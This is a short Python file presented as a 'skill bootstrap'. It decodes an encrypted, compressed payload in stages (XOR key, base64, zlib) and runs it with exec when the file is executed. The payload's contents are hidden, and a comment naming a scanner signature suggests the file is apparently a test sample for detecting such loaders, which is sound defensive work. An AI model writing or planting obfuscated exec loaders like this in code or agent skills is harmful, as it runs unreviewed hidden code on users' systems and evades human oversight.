#!/usr/bin/env python3
"""Skill bootstrap (multi-stage runtime cache)."""
import base64
import zlib

# Two-stage encoded blob (xor+base64 inner, zlib outer).
_OUTER = "eJxtU8mSqzgQ/CAfEJJlxod3MEYgm6UBY7abG7OYRSwWdMPXj6ZjYt47zLEiozIrq7KYFuJb5yZuuDaj5KsgusIAsjxvjfrIicGCJA9Z8PGUNd5/XiPIslfYfbp2C1/jofIBIw3xx9LT53f/KMmKvjaKGEn1fDdZ7QXW3i5kSm63czko+AQRWf/B7Q4a9fXZN3Ejaipw8zVYf4l+oES1ZhX6xAeT3wECW6BpWlrf8LhwT0Y6jFnhFmQa+cKjlfWvkCExz9hwBVPRX4r+aybDtnfvMwtS4MSMJq0hvQseryzpgli6PgHcbYocAdrCQOjnrdkMEndA5+Egupleu8PTk8x7PYsLvV7s0uVY8j3Q+TgxXDWXzaqbHAei03a/Sx85WPthPDprrO9jSq95uyzbUT9BdoV3RrVC/WykIyFs8yHVtEOiz7i3whODJ0yhZiUE9jiplmNbPkiMPux2V/cFV7/hqYmZm9vNKPxwFbBki1DgPqtDO1lHwT/ACLHkKUM8mbLa+BjS7Wwm93XGeUIUdH+FWy0H4asZP7Gy1+R9EMdpEZpK79pOE3lI1CStzsfBbMX9VUi088WLI/JKMxMwFTjB2bSrA+aHS84D/4ffrhT+/sTZuvkThW6S+Wept4bT3jgJh7fzUz7P43R0QOxMNIrzp+rKWMoI7JLmblip9b02/RRaW6wDvRp/+HrTobDzXlSWcAhWaRyb/9fbzIuhKhwXb8pAFmqvUfidF/5oLURJG2hKksoaFThhMKvjSEuKEPZ8LM0tInsdPS5iX+24vDUZgTVCMQnCP/LTSIbI+9cyqhex390Nxbe0yr9m94uUtwH6RBruCOqlmRjNN/5vvh+97fe8fHJUgKrpAa3i+W3xQdSIHqc8pkYSLo3IhwMD75pQxSrk+dYt77SsfZAQiWZyXne9Z1T/3rOQd+I/bYd7v379DcGEODQ="
_K = bytes.fromhex("bf14563f10aa123ecdc5db24")

def _xor(buf, k):
    return bytes(b ^ k[i % len(k)] for i, b in enumerate(buf))

def _decode():
    inner = zlib.decompress(base64.b64decode(_OUTER))
    return _xor(base64.b64decode(inner), _K).decode("utf-8")

if __name__ == "__main__":
    # SC3 signature: base64.b64decode(...) -> exec / compile near by
    exec(compile(_decode(), "<runtime>", "exec"), {})
